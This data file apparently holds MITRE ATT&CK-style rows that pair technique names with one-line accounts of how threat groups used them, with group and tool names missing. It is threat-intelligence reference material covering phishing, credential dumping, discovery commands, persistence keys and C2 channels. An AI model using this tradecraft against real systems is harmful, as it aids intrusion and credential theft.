Pass the Hash,used pass-the-hash tools to gain usernames and passwords.,relationship
Remote Access Software,has used several remote administration tools as persistent infiltration channels.,relationship
Malicious Link,enticed users to click on links in spearphishing emails to download malware.,relationship
External Remote Services,has used compromised VPN accounts to gain access to victim systems.,relationship
Software Packing,is known to use software packing in its tools.,relationship
Remote Data Staging,has copied files to company web servers and subsequently downloaded them.,relationship
Malware,used privately developed and customized remote access tools.,relationship
Process Discovery,has run tasklist on a victim's machine.,relationship
Deobfuscate/Decode Files or Information,A  macro has run a PowerShell command to decode file contents.  has also used  to decode base64-encoded files on victims.,relationship
Custom Command and Control Protocol,has used custom DNS Tunneling protocols for C2.,relationship
Automated Collection,has used automated collection.,relationship
File Deletion,has deleted files associated with their payload after execution.,relationship
Screen Capture,has a tool called CANDYKING to capture a screenshot of user's desktop.,relationship
SSH,has used Putty to access compromised systems.,relationship
Local Groups,has used net localgroup administrators to find local administrators on compromised systems.,relationship
Network Service Scanning,has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.,relationship
Command and Scripting Interpreter,has used various types of scripting for execution.,relationship
External Remote Services,uses remote services such as VPN Citrix or OWA to persist in an environment.,relationship
Remote Desktop Protocol,has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.,relationship
Windows Management Instrumentation,has used WMI for execution.,relationship
Scheduled Task,has created scheduled tasks that run a VBScript to execute a payload on victim machines.,relationship
System Network Connections Discovery,has used netstat -an on a victim to get a listing of network connections.,relationship
System Service Discovery,has used sc query on a victim to gather information about services.,relationship
System Network Configuration Discovery,has run ipconfig /all on a victim.,relationship
Query Registry,has used reg query HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default on a victim to query the Registry.,relationship
Keylogging,has used keylogging tools called KEYPUNCH and LONGWATCH.,relationship
System Information Discovery,has run hostname and systeminfo on a victim.,relationship
Domain Account,has run net user net user /domain net group domain admins /domain and net group Exchange Trusted Subsystem /domain to get account listings on a victim.,relationship
Brute Force,has used brute force techniques to obtain credentials.,relationship
Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,has exfiltrated data over FTP separately from its primary C2 channel over DNS.,relationship
Spearphishing Attachment,has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.,relationship
Malicious File,has delivered macro-enabled documents that required targets to click the enable content button to execute the payload on the system.,relationship
Obfuscated Files or Information,has encrypted and encoded data in its malware including by using base64.,relationship
PowerShell,has used PowerShell scripts for execution including use of a macro to run a PowerShell command to decode file contents.,relationship
Web Protocols,has used HTTP for C2.,relationship
Web Shell,has used Web shells often to maintain access to a victim network.,relationship
Indicator Removal from Tools,has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion.,relationship
System Owner/User Discovery,has run whoami on a victim.,relationship
LSASS Memory,has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.,relationship
Spearphishing Link,has sent spearphising emails with malicious links to potential victims.,relationship
Fallback Channels,malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.,relationship
Password Policy Discovery,has used net.exe in a script with net accounts /domain to find the password policy of a domain.,relationship
Compiled HTML File,has used a CHM payload to load and execute another malicious file once delivered to a victim.,relationship
Valid Accounts,has used compromised credentials to access other systems on a victim network.,relationship
Ingress Tool Transfer,can download remote files onto victims.,relationship
Asymmetric Cryptography,used the Plink utility and other tools to create tunnels to C2 servers.,relationship
Credentials In Files,has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.,relationship
Commonly Used Port,has used port 80 to call back to the C2 server.,relationship
Spearphishing via Service,has used LinkedIn to send spearphishing links.,relationship
Protocol Tunneling,has used the Plink utility and other tools to create tunnels to C2 servers.,relationship
DNS,has used DNS for C2.,relationship
Malicious Link,has delivered malicious links to achieve execution on the target system.,relationship
Local Account,has run net user net user /domain net group domain admins /domain and net group Exchange Trusted Subsystem /domain to get account listings on a victim.,relationship
Domain Groups,has used net group /domain net group domain admins /domain and net group Exchange Trusted Subsystem /domain to find domain group permission settings.,relationship
LSA Secrets,has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.,relationship
Cached Domain Credentials,has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.,relationship
Credentials from Password Stores,has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.,relationship
Credentials from Web Browsers,has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.  has also used tools named VALUEVAULT and PICKPOCKET to dump passwords from web browsers.,relationship
Windows Command Shell,has used macros to deliver malware such as  and .  has used batch scripts.,relationship
Outlook Home Page,has abused the Outlook Home Page feature for persistence.  has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.,relationship
SMB/Windows Admin Shares,has copied its backdoor across open network shares including ADMIN$ C$WINDOWS D$WINDOWS and E$WINDOWS.,relationship
Web Protocols,has used HTTP for C2.,relationship
Exploitation for Privilege Escalation,has leveraged a zero-day vulnerability to escalate privileges.,relationship
Non-Application Layer Protocol,has used the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.,relationship
Custom Command and Control Protocol,has used the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.,relationship
LSASS Memory,has used keyloggers that are also capable of dumping credentials.,relationship
Ingress Tool Transfer,has transferred files using the Intel Active Management Technology (AMT) Serial-over-LAN (SOL) channel.,relationship
Process Injection,has used various methods of process injection including hot patching.,relationship
Drive-by Compromise,has sometimes used drive-by attacks against vulnerable browser plugins.,relationship
Keylogging,has used several different keyloggers.,relationship
Spearphishing Attachment,has sent spearphishing emails with attachments to victims as its primary initial access vector.,relationship
Malicious File,has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.,relationship
Credential API Hooking,is capable of using Windows hook interfaces for information gathering such as credential access.,relationship
Rename System Utilities,has renamed rar.exe to avoid detection.,relationship
Drive-by Compromise,has used watering hole attacks to deliver malicious versions of legitimate installers.,relationship
Registry Run Keys / Startup Folder,has used Registry run keys to establish persistence.,relationship
Code Signing,has signed code with self-signed certificates.,relationship
Match Legitimate Name or Location,has disguised malicious installer files by bundling them with legitimate software installers.,relationship
Malicious File,has attempted to get users to execute compromised installation files for legitimate software including compression applications security software browsers file recovery applications and other tools and utilities.,relationship
Port Knocking,has used a script that configures the knockd service and firewall to only accept C2 connections from systems that use a specified sequence of knock ports.,relationship
Local Accounts,has created admin accounts on a compromised host.,relationship
Masquerade Task or Service,has named services to appear legitimate.,relationship
Windows Service,has created new services and modified existing services for persistence.,relationship
Digital Certificates,has created self-signed digital certificates for use in HTTPS C2 traffic.,relationship
Code Signing Certificates,has created self-signed certificates to sign malicious installers.,relationship
File and Directory Discovery,A  payload has searched all fixed drives on the victim for files matching a specified list of extensions.,relationship
System Information Discovery,collected the victim computer name OS version and architecture type and sent the information to its C2 server.  also enumerated all available drives on the victim's machine.,relationship
Process Hollowing,A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.,relationship
Dynamic Data Exchange,leveraged the DDE protocol to deliver their malware.,relationship
Archive Collected Data,encrypted the collected files' path with AES and then encoded them with base64.,relationship
Ingress Tool Transfer,payloads download additional files from the C2 server.,relationship
Exploitation for Client Execution,uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570 CVE-2012-1856 CVE-2014-4114 CVE-2017-0199 CVE-2017-11882 and CVE-2015-1641.,relationship
File Deletion,removed certain files and replaced them so they could not be retrieved.,relationship
Security Software Discovery,scanned the Program Files directories for a directory with the string Total Security (the installation path of the 360 Total Security antivirus tool).,relationship
Credentials from Web Browsers,dumped the login data database from \AppData\Local\Google\Chrome\User Data\Default\Login Data.,relationship
Obfuscated Files or Information,has obfuscated a script with Crypto Obfuscator.,relationship
Scheduled Task,A  file stealer can run a TaskScheduler DLL to add persistence.,relationship
DLL Side-Loading,A  .dll that contains  is loaded and executed using DLL side-loading.,relationship
Automated Collection,developed a file stealer to search C:\ and collect files with certain extensions.  also executed a script to enumerate all drives store them as a list and upload generated files to the C2 server.,relationship
Registry Run Keys / Startup Folder,has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.,relationship
Binary Padding,apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.,relationship
Drive-by Compromise,has used watering holes to deliver files with exploits to initial victims.,relationship
Bypass User Account Control,bypassed User Access Control (UAC).,relationship
PowerShell,used  to download payloads run a reverse shell and execute malware on the victim's machine.,relationship
Indicator Removal from Tools,apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.,relationship
Software Packing,A  payload was packed with UPX.,relationship
Spearphishing Attachment,has used spearphishing with an attachment to deliver files with exploits to initial victims.,relationship
Local Data Staging,copied all targeted files to a directory called index that was eventually uploaded to the C&C server.,relationship
System Owner/User Discovery,collected the victim username and whether it was running as admin then sent the information to its C2 server.,relationship
Malicious File,embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.,relationship
Standard Encoding,used Base64 to encode C2 traffic.,relationship
Spearphishing Link,has used spearphishing with links to deliver files with exploits to initial victims. The group has also used embedded image tags (known as web bugs) with unique per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.,relationship
Modify Registry,A  payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.,relationship
Match Legitimate Name or Location,installed its payload in the startup programs folder as Baidu Software Update. The group also adds its second stage payload to the startup programs as Net Monitor. They have also dropped  binaries as files named microsoft_network.exe and crome.exe.,relationship
Data from Local System,collected and exfiltrated files from the infected system.,relationship
Remote Desktop Protocol,attempted to use RDP to move laterally.,relationship
Dead Drop Resolver,hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.,relationship
Windows Command Shell,ran a reverse shell with Meterpreter.  used JavaScript code and .SCT files on victim machines.,relationship
Visual Basic,used Visual Basic Scripts (VBS) on victim machines.,relationship
Code Signing,has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.,relationship
BITS Jobs,has used BITS jobs to download malicious payloads.,relationship
Malicious Link,has used spearphishing with links to try to get users to click download and open malicious files.,relationship
Code Signing Certificates,has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.,relationship
Valid Accounts,attempts to obtain legitimate credentials during operations.,relationship
Disable or Modify Tools,Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).,relationship
Registry Run Keys / Startup Folder,A dropper used by  installs itself into the ASEP Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run with a value named McUpdate.,relationship
Dynamic-link Library Injection,An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network including Outlook Express (msinm.exe) Outlook (outlook.exe) Internet Explorer (iexplore.exe) and Firefox (firefox.exe).,relationship
Obfuscated Files or Information,Droppers used by  use RC4 or a 16-byte XOR key consisting of the bytes 0xA0  0xAF to obfuscate payloads.,relationship
Dead Drop Resolver,has used an RSS feed on Livejournal to update a list of encrypted C2 server names.,relationship
Drive-by Compromise,has distributed its malware via the RIG and SUNDOWN exploit kits as well as online advertising network Yandex.Direct.,relationship
Spearphishing Attachment,has used spearphishing attachments to distribute its malware.,relationship
Registry Run Keys / Startup Folder,has used Registry run keys to establish persistence for the  Trojan and other tools such as a modified version of TeamViewer remote desktop software.,relationship
Remote Access Software,has used a modified version of TeamViewer and Remote Utilities for remote access.,relationship
DLL Search Order Hijacking,has used search order hijacking to force TeamViewer to load a malicious DLL.,relationship
Malicious File,has attempted to lure victims into opening e-mail attachments to execute malicious code.,relationship
Spearphishing Attachment,has attached a malicious document to an email to gain initial access.,relationship
Scheduled Task,launched a scheduled task to gain persistence using the schtasks /create /sc command.,relationship
Ingress Tool Transfer,has downloaded additional malware including by using .,relationship
Web Protocols,has used HTTP for C2.,relationship
Windows Command Shell,has used cmd.exe to execute commmands.,relationship
Malicious File,attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.,relationship
Msiexec,has used msiexec to download and execute malicious installer files over HTTP.,relationship
Visual Basic,has used VBS scripts as well as embedded macros for execution.,relationship
Obfuscated Files or Information,has used Base64 encoding within malware variants.  has also used ROT13 encoding AES encryption and compression with the zlib library for their Python-based backdoor.,relationship
Spearphishing Attachment,has delivered malicious Microsoft Office attachments via spearphishing emails.,relationship
Exploitation for Client Execution,has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).,relationship
Standard Encoding,BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.,relationship
Proxy,BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet but are interconnected locally.,relationship
Web Protocols,BCS-server tool connects to the designated C2 server via HTTP.,relationship
File Deletion,has used backdoors that can delete files used in an attack from an infected system.,relationship
Deobfuscate/Decode Files or Information,VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.,relationship
Exfiltration Over C2 Channel,has sent system information to its C2 server using HTTP.,relationship
Network Sniffing,has used intercepter-NG to sniff passwords in network traffic.,relationship
Domain Account,has used a tool to query Active Directory using LDAP discovering information about usernames listed in AD.,relationship
Keylogging,has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.,relationship
LSASS Memory,plainpwd tool is a modified version of  and dumps Windows credentials from system memory.,relationship
Credentials from Web Browsers,CredRaptor tool can collect saved passwords from various internet browsers.,relationship
Ingress Tool Transfer,Python backdoor can push additional malicious tools to an infected system.,relationship
Bidirectional Communication,has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor.  also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.,relationship
Match Legitimate Name or Location,has avoided detection by naming a malicious binary explorer.exe.,relationship
Malicious File,has delivered spearphishing attachments with malicious macros embedded within files.,relationship
Data Destruction,has used the  KillDisk component to overwrite files on Windows-based Human-Machine Interfaces. ,relationship
Disk Structure Wipe,has used the  KillDisk component to corrupt the infected system's master boot record.,relationship
Valid Accounts,have used previously acquired legitimate credentials prior to attacks.,relationship
External Remote Services,has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network.  has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.,relationship
Visual Basic,has created VBScripts to run an SSH server.,relationship
Non-Standard Port,has used port 6789 to accept connections on the group's SSH server.,relationship
Remote Access Software,has used remote administration tools or remote industrial control system client software to maliciously release electricity breakers.,relationship
Compromise Software Supply Chain,has distributed  by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.,relationship
Rundll32,used a backdoor which could execute a supplied DLL using rundll32.exe.,relationship
System Information Discovery,used a backdoor to enumerate information about the infected system's operating system.,relationship
Email Account,used malware to enumerate email settings including usernames and passwords from the M.E.Doc application.,relationship
System Network Configuration Discovery,used malware to enumerate proxy settings from the M.E.Doc application.,relationship
Remote System Discovery,has used a tool to query Active Directory using LDAP discovering information about computers listed in AD.,relationship
Right-to-Left Override,has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.,relationship
Registry Run Keys / Startup Folder,first-stage downloader installed  to the startup folder %Startup%\mssync.exe.,relationship
Native API,first-stage downloader resolved various Windows libraries and APIs including LoadLibraryA() GetProcAddress() and CreateProcessA().,relationship
Visual Basic,first-stage downloader was a VBA macro.,relationship
Ingress Tool Transfer,downloaded additional payloads after a target was infected with a first-stage downloader.,relationship
Process Injection,has leveraged embedded shellcode to inject a downloader into the memory of Word.,relationship
Malicious File,has sent malicious DOC and PDF files to targets so that they can be opened by a user.,relationship
Spearphishing Attachment,has sent malicious attachments via emails to targets.,relationship
Dynamic Data Exchange,has sent malicious Word OLE documents to victims.,relationship
Video Capture,has been observed making videos of victims to observe bank employees day to day activities.,relationship
Screen Capture,can capture victim screen activity.,relationship
File Deletion,has deleted artifacts including scheduled tasks communicates files from the C2 and other logs.,relationship
Obfuscated Files or Information,has used environment variable string substitution for obfuscation.,relationship
Native API,has leveraged the Windows API including using CreateProcess() or ShellExecute() to perform a variety of tasks.,relationship
Compiled HTML File,has weaponized CHM files in their phishing campaigns.,relationship
Malicious File,attempts to get users to launch malicious attachments delivered via spearphishing emails.,relationship
Windows Command Shell,has used Windows command-line to run commands.,relationship
Service Execution,has used  to install a service on the remote system.,relationship
Visual Basic,has used VBS scripts.,relationship
Scheduled Task,has used scheduled tasks to stage its operation.,relationship
Spearphishing Attachment,has sent emails with malicious DOCX CHM LNK and ZIP attachments. ,relationship
JavaScript/JScript,has used JS scripts.,relationship
PowerShell,has used PowerShell to download and execute payloads.,relationship
Code Signing,has used a valid certificate to sign their primary loader Silence.Downloader (aka TrueBot).,relationship
Valid Accounts,has used compromised credentials to log on to other systems and escalate privileges.,relationship
Match Legitimate Name or Location,has named its backdoor WINWORD.exe.,relationship
Modify Registry,can create delete or modify a specified Registry key or value.,relationship
LSASS Memory,has used the Farse6.1 utility (based on ) to extract credentials from lsass.exe.,relationship
Remote System Discovery,has used Nmap to scan the corporate network build a network topology and identify vulnerable hosts.,relationship
Remote Desktop Protocol,has used RDP for lateral movement.,relationship
Ingress Tool Transfer,has downloaded additional modules and malware to victims machines.,relationship
Registry Run Keys / Startup Folder,has used HKCU\Software\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Microsoft\Windows\CurrentVersion\Run and the Startup folder to establish persistence.,relationship
Process Injection,has injected a DLL library containing a Trojan into the fwmain32.exe process.,relationship
Software Deployment Tools,has used RAdmin a remote software tool used to remotely control workstations and ATMs.,relationship
External Proxy,has used ProxyBot which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\Socks5.,relationship
Non-Standard Port,has used port 444 when sending data about the system from the client to the server.,relationship
Mail Protocols,uses SMTP for C2 communications.,relationship
Web Protocols,uses HTTP for C2 communications.,relationship
File Transfer Protocols,uses FTP for C2 communications.,relationship
Exploit Public-Facing Application,exploited a publicly-facing server to gain access to the network.,relationship
DLL Side-Loading,used DLL side-loading to covertly load  into memory on the victim machine.,relationship
Valid Accounts,leveraged valid accounts to maintain access to a victim network.,relationship
Domain Account,created rogue high-privileged domain user accounts to maintain access across waves of a compromise.,relationship
Web Shell,used Web shells to persist in victim environments and assist in execution and exfiltration.,relationship
PowerShell,used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.,relationship
Windows Management Instrumentation,used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.,relationship
Windows Command Shell,used the Windows command shell to execute commands.,relationship
Security Account Manager,used reg commands to dump specific hives from the Windows Registry such as the SAM hive and obtain password hashes.,relationship
LSASS Memory,used a modified version of  along with a PowerShell-based  to dump credentials on the victim machines.,relationship
System Network Configuration Discovery,used ipconfig /all to obtain information about the victim network configuration. The group also ran a modified version of nbtscan to identify available NetBIOS name servers.,relationship
System Network Connections Discovery,used netstat -oan to obtain information about the victim network connections.,relationship
System Owner/User Discovery,used whoami and query user to obtain information about the victim user.,relationship
Ingress Tool Transfer,dropped additional tools to victims during their operation including portqry.exe a renamed cmd.exe file winrar and .,relationship
Rename System Utilities,used a renamed cmd.exe file to evade detection.,relationship
Scheduled Task,established persistence for  by created a scheduled task.,relationship
Software Packing,packed some payloads using different types of packers both known and custom.,relationship
External Proxy,used a modified version of  to redirect connections between networks.,relationship
Obfuscated Files or Information,used a modified version of  in which they obfuscated strings such as debug messages in an apparent attempt to evade detection.,relationship
Local Data Staging,compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration.,relationship
Archive via Utility,used WinRAR to compress and encrypt stolen data prior to exfiltration.,relationship
External Remote Services,established VPN access into victim environments.,relationship
Remote System Discovery,used a modified version of nbtscan to identify available NetBIOS name servers over the network as well as ping to identify remote systems.,relationship
Data from Local System,collected data from the victim's local system including password hashes from the SAM hive in the Registry.,relationship
Pass the Hash,used dumped hashes to authenticate to other machines via pass the hash.,relationship
Indicator Removal from Tools,ensured each payload had a unique hash including by using different types of packers.,relationship
Exfiltration Over C2 Channel,used Web shells and  for C2 as well as to exfiltrate data.,relationship
OS Credential Dumping,has used credential dumping tools.,relationship
File and Directory Discovery,identified and extracted all Word documents on a server by using a command containing * .doc and *.docx. The actors also searched for documents based on a specific date range and attempted to identify all installed software on a victim.,relationship
Keylogging,has used keylogging tools.,relationship
Archive via Utility,extracted documents and bundled them into a RAR archive.,relationship
Network Share Discovery,listed remote shared drives that were accessible from a victim.,relationship
Windows Command Shell,has used command line during its intrusions.,relationship
Data from Network Shared Drive,extracted Word documents from a file server on a victim network.,relationship
System Information Discovery,obtained OS version and hardware configuration from a victim.,relationship
Match Legitimate Name or Location,named its tools to masquerade as Windows or Adobe Reader software such as by using the file name adobecms.exe and the directory CSIDL_APPDATA\microsoft\security.,relationship
LSASS Memory,gathers credentials using  and Procdump. ,relationship
Network Sniffing,has a tool to sniff the network for passwords. ,relationship
Local Accounts,has a tool to add a Windows admin account in order to allow them to ensure continued access via RDP. ,relationship
Keylogging,has a tool to log keystrokes to %userprofile%\appdata\roaming\apach.{txtlog}. ,relationship
Remote Desktop Protocol,utilized RDP for direct remote point-and-click access. ,relationship
Browser Extensions,victims are prompted to install malicious Google Chrome extensions which gave the threat actor the ability to read data from any website accessed. ,relationship
Spearphishing Link,sent spearphishing emails containing links to domains controlled by the threat actor.,relationship
Credentials In Files,has used tools that are capable of obtaining credentials from saved mail.,relationship
Credentials from Web Browsers,has used tools that are capable of obtaining credentials from web browsers.,relationship
Internal Proxy,has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.,relationship
Password Filter DLL,has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain local user or administrator logs in or changes a password.,relationship
Hidden File System,has used a hidden file system that is stored as a file on disk.,relationship
Network Service Scanning,the victim's internal network for hosts with ports 8080 5900 and 40 open.,relationship
Valid Accounts,used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.,relationship
Windows Command Shell,Several tools used by  have been command-line driven.,relationship
OS Credential Dumping,used a signed credential-dumping tool to obtain victim account credentials.,relationship
Code Signing,has used stolen certificates to sign its malware.,relationship
Spearphishing Attachment,has targeted victims using spearphishing emails with malicious Microsoft Word attachments.,relationship
Exploitation for Client Execution,has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.,relationship
Malicious File,has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.,relationship
Visual Basic,has a VBScript for execution.,relationship
PowerShell,has used PowerShell for execution of a payload.,relationship
Spearphishing Attachment,has used spearphishing emails with malicious attachments to initially compromise victims.,relationship
Dynamic Data Exchange,has leveraged malicious Word documents that abused DDE.,relationship
Spearphishing Link,has sent spearphishing emails containing malicious links.,relationship
PowerShell,has used PowerShell to download and execute malware and reconnaissance scripts.,relationship
Visual Basic,has used VBS for code execution.,relationship
Data Encrypted for Impact,has used a wide variety of ransomware such as Locky Jaff Bart Philadelphia and GlobeImposter to encrypt victim files and demand a ransom payment.,relationship
Credentials In Files,has used malware to gather credentials from FTP clients and Outlook.,relationship
Obfuscated Files or Information,has password-protected malicious Word documents and used base64 encoded PowerShell commands.,relationship
Malicious File,has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example  makes their malware look like legitimate Microsoft Word documents .pdf and/or .lnk files. ,relationship
Msiexec,has used msiexec to download and execute malicious Windows Installer files.,relationship
Rundll32,has leveraged rundll32.exe to execute malicious DLLs.,relationship
Code Signing,has signed payloads with code signing certificates from Thawte and Sectigo.,relationship
Ingress Tool Transfer,has downloaded additional malware to execute on victim systems.,relationship
Credentials from Web Browsers,has used malware to gather credentials from Internet Explorer.,relationship
Malicious Link,has used lures to get users to click links in emails and attachments. For example  makes their malware look like legitimate Microsoft Word documents .pdf and/or .lnk files. ,relationship
JavaScript/JScript,has used JavaScript for code execution.,relationship
Windows Command Shell,has executed commands using cmd.exe.,relationship
Fast Flux DNS,has used fast flux to mask botnets by distributing payloads across multiple IPs.,relationship
Email Account,has used the tool EmailStealer to steal and send lists of e-mail addresses to a remote server.,relationship
Permission Groups Discovery,has used TinyMet to enumerate members of privileged groups.  has also run net group /domain.,relationship
Domain Accounts,has used stolen domain admin accounts to compromise additional hosts.,relationship
Software Packing,has used UPX to obscure malicious code.,relationship
Web Protocols,has used HTTP to communiate with C2 nodes.,relationship
Dynamic-link Library Injection,has been seen injecting a DLL into winword.exe.,relationship
Match Legitimate Name or Location,has renamed files to look like legitimate files such as Windows update files or Schneider Electric application files.,relationship
LSASS Memory,has used  and a custom tool SecHack to harvest credentials. ,relationship
Image File Execution Options Injection,has modified and added entries within HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options to maintain persistence.,relationship
Scheduled Task,has used scheduled task XML triggers.,relationship
Timestomp,used timestomping to modify the $STANDARD_INFORMATION attribute on tools.,relationship
File Deletion,routinely deleted tools logs and other files after they were finished with them.,relationship
Local Data Staging,has created staging folders in directories that were infrequently used by legitimate users or processes.,relationship
SSH,has relied on encrypted SSH-based tunnels to transfer tools and for remote command/program execution.,relationship
Valid Accounts,has used compromised VPN accounts.,relationship
Remote Desktop Protocol,utilized RDP throughout an operation.,relationship
External Remote Services,has used a VPN to persist in the victim environment.,relationship
Web Shell,has planted Web shells on Outlook Exchange servers.,relationship
Uncommonly Used Port,has used ports 4444 8531 and 50501 for C2.,relationship
Commonly Used Port,has used port 443 for C2.,relationship
PowerShell,has used a publicly-available PowerShell-based tool WMImplant. The group has also used PowerShell to perform ing.,relationship
Indicator Removal from Tools,has modified files based on the open-source project cryptcat in an apparent attempt to decrease AV detection rates.,relationship
Non-Standard Port,has used port-protocol mismatches on ports such as 443 4444 8531 and 50501 during C2.,relationship
Virtual Private Server,has used Virtual Private Server (VPS) infrastructure.,relationship
System Time Discovery,has checked the current date on the victim system.,relationship
Security Software Discovery,has checked for specific antivirus products on the targets computer including Kaspersky Quick Heal AVG BitDefender Avira Sophos Avast! and ESET.,relationship
File Deletion,has the ability to delete its malware entirely from the target system.,relationship
Exploitation for Client Execution,has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.,relationship
Software Packing,has obfuscated their payloads through packing.,relationship
Malicious File,has used phishing lure documents that trick users into opening them and infecting their computers.,relationship
Spearphishing Attachment,has sent phishing emails with malicious Microsoft Word attachments to victims.,relationship
Windows Command Shell,actors spawned shells on remote systems on a victim network to execute commands.,relationship
SMB/Windows Admin Shares,actors mapped network drives using net use.,relationship
Domain Accounts,actors used compromised domain credentials for the victim's endpoint management platform Altiris to move laterally.,relationship
Software Deployment Tools,actors used a victim's endpoint management platform Altiris for lateral movement.,relationship
Remote System Discovery,has used the net view command.,relationship
Local Account,has used net user to conduct internal discovery of systems.,relationship
Ingress Tool Transfer,After re-establishing access to a victim network  actors download tools including  and WCE that are staged temporarily on websites that were previously compromised but never used.,relationship
Archive via Library,has used RAR to compress encrypt and password-protect files prior to exfiltration.,relationship
DLL Search Order Hijacking,has performed DLL search order hijacking to execute their payload.,relationship
Web Protocols,malware has used HTTP for C2.,relationship
PowerShell,has used PowerShell for execution.,relationship
DLL Side-Loading,has used DLL side-loading including by using legitimate Kaspersky antivirus variants in which the DLL acts as a stub loader that loads and executes the shell code.,relationship
Process Hollowing,A  tool can spawn svchost.exe and inject the payload into that process.,relationship
System Network Connections Discovery,has used net use to conduct internal discovery of systems. The group has also used quser.exe to identify existing RDP sessions on a victim.,relationship
External Remote Services,actors look for and use VPN profiles during an operation to access the network using external VPN services.  has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network.,relationship
Obfuscated Files or Information,A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploits shikata_ga_nai encoder as well as compressed with LZNT1 compression.,relationship
Bypass User Account Control,A  tool can use a public UAC bypass method to elevate privileges.,relationship
Windows Remote Management,has used WinRM to enable remote execution.,relationship
Exploitation for Privilege Escalation,has used CVE-2014-6324 to escalate privileges.,relationship
Data Transfer Size Limits,actors have split RAR files for exfiltration into parts.,relationship
Windows Management Instrumentation,A  tool can use WMI to execute a binary.,relationship
File Deletion,has deleted existing logs and exfiltrated file archives from a victim.,relationship
LSA Secrets,actors have used  to dump credentials. They have also dumped credentials from domain controllers.,relationship
Network Share Connection Removal,has detached network shares after exfiltrating files likely to evade detection.,relationship
System Network Configuration Discovery,actors use nbtscan to discover vulnerable systems.,relationship
Commonly Used Port,C2 traffic for most  tools occurs over Port Numbers 53 80 and 443.,relationship
Windows Command Shell,has used command-line interfaces for execution.,relationship
Modify Registry,A  tool can create a new Registry key under HKEY_CURRENT_USER\Software\Classes\.,relationship
Drive-by Compromise,has extensively used strategic web compromises to target victims.,relationship
Valid Accounts,actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.,relationship
Data from Local System,ran a command to compile an archive of file types of interest from the victim user's directories.,relationship
Local Data Staging,has locally staged encrypted archives for later exfiltration efforts.,relationship
Keylogging,actors installed a credential logger on Microsoft Exchange servers.  also leveraged the reconnaissance framework ScanBox to capture keystrokes.,relationship
Automated Collection,ran a command to compile an archive of file types of interest from the victim user's directories.,relationship
Disable Windows Event Logging,has used appcmd.exe to disable logging on a victim server.,relationship
At (Windows),actors use  to schedule tasks to run self-extracting RAR archives which install  or  on other victims on a network.,relationship
Registry Run Keys / Startup Folder,A  tool can add the binarys path to the Registry key Software\Microsoft\Windows\CurrentVersion\Run to add persistence.,relationship
Deobfuscate/Decode Files or Information,During execution  malware deobfuscates and decompresses code that was encoded with Metasploits shikata_ga_nai encoder as well as compressed with LZNT1 compression.,relationship
